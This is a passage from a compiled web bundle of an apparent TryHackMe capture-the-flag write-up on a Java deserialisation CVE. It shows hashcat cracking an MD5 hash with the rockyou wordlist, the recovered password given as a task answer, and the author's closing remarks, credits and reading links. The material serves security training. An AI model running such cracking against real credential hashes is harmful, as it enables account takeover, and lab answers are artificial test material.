Pure (unoptimized) OpenCL kernels selected.\nThis enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.\nIf you want to switch to optimized OpenCL kernels, append -O to your commandline.\n\nWatchdog: Hardware monitoring interface not found on your system.\nWatchdog: Temperature abort trigger disabled.\n\n* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=0 -D _unroll'\nDictionary cache hit:\n* Filename..: /usr/share/wordlists/rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385\n\nbc77ac072ee30e3760806864e234c7cf:zxcvbnm123456789\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Type........: MD5\nHash.Target......: bc77ac072ee30e3760806864e234c7cf\nTime.Started.....: Wed Oct 14 15:22:34 2020 (1 sec)\nTime.Estimated...: Wed Oct 14 15:22:35 2020 (0 secs)\nGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:   463.6 kH/s (0.55ms) @ Accel:1024 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts\nProgress.........: 231424/14344385 (1.61%)\nRejected.........: 0/231424 (0.00%)\nRestore.Point....: 229376/14344385 (1.60%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidates.#1....: 170176 -> youngc1\n\nStarted: Wed Oct 14 15:22:28 2020\nStopped: Wed Oct 14 15:22:35 2020\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"zxcvbnm123456789")),(0,r.kt)("h2",{id:"task-8-final-remarks-credits--further-reading"},"Task 8 Final Remarks, Credits & Further Reading"),(0,r.kt)("p",null,"Final Remarks"),(0,r.kt)("p",null,"I hope this was a refreshing CTF, where classic techniques meet new content on THM - all of which are not based around Metasploit!"),(0,r.kt)("p",null,"This type of attack can prove to be extremely dangerous - as you'd hopefully have discovered by now. It's still very real as sigh, java web applications are still used day-to-day. Because of their nature, \"Serialisation\" attacks all execute server-side, and as such - it results in being very hard to prevent from Firewalls / IDS' / IPS'."),(0,r.kt)("p",null,"For any and all feedback, questions, problems or future ideas you'd like to be covered, please get in touch in the TryHackMe Discord (following Rule #1)"),(0,r.kt)("p",null,"So long and thanks for all the fish!"),(0,r.kt)("p",null,"~CMNatic"),(0,r.kt)("p",null,"Credits"),(0,r.kt)("p",null,"Again, to reiterate, the provided downloadable material has only slightly been adapted to ensure compatibility for all users across TryHackMe. Generating and executing the payload especially is very user-environment dependant (i.e. Java versions, of which are hard to manage on Linux, etc...)"),(0,r.kt)("p",null,"Many thanks to byt3bl33d3r for providing a reliable Proof of Concept, and finally to all the contributors towards Frohoff's Ysoserial which facilitates the payload generation used for this CVE."),(0,r.kt)("p",null,"Further Reading"),(0,r.kt)("p",null,'If you are curious into the whole "Serialisation" and "De-Serialisation" process and how it can be exploited, I recommend the following resources:'),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://www.baeldung.com/java-serialization"},"https://www.baeldung.com/java-serialization")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"http://frohoff.github.io/appseccali-marshalling-pickles/"},"http://frohoff.github.io/appseccali-marshalling-pickles/")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data"},"https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://www.darkreading.com/informationweek-home/why-the-java-deserialization-bug-is-a-big-deal/d/d-id/1323237"},"https://www.darkreading.com/informationweek-home/why-the-java-deserialization-bug-is-a-big-deal/d/d-id/1323237"))))}u.isMDXComponent=!0}}]);